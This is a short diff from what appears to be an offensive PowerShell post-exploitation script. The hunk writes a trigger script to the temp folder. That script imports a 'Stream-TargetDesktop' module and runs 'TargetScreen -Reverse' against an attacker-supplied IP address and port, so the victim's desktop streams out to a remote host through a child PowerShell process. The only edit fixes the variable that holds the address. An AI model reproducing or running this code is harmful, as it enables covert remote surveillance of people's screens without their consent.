@@ -2980,7 +2980,7 @@ If($LiveStream -ne "false"){
       ## Create trigger script to import\run module on a diferent process! (child)
       Write-Host "Creating trigger.ps1 to import \ run module on a diferent process! (child)"
       echo "Import-Module -Name `"$Env:TMP\Stream-TargetDesktop.ps1`" -EA SilentlyContinue -Force"|Out-File -FilePath "$Env:TMP\trigger.ps1" -Encoding ascii -Force
-      Add-Content $Env:TMP\trigger.ps1 "TargetScreen -Reverse -IPAddress $Address -Port $Port"
+      Add-Content $Env:TMP\trigger.ps1 "TargetScreen -Reverse -IPAddress $IpAddess -Port $Port"
 
       ## Run remote module in a new powershell process
       Write-Host "Executing Start-Process to run module in a new powershell process! (child)"
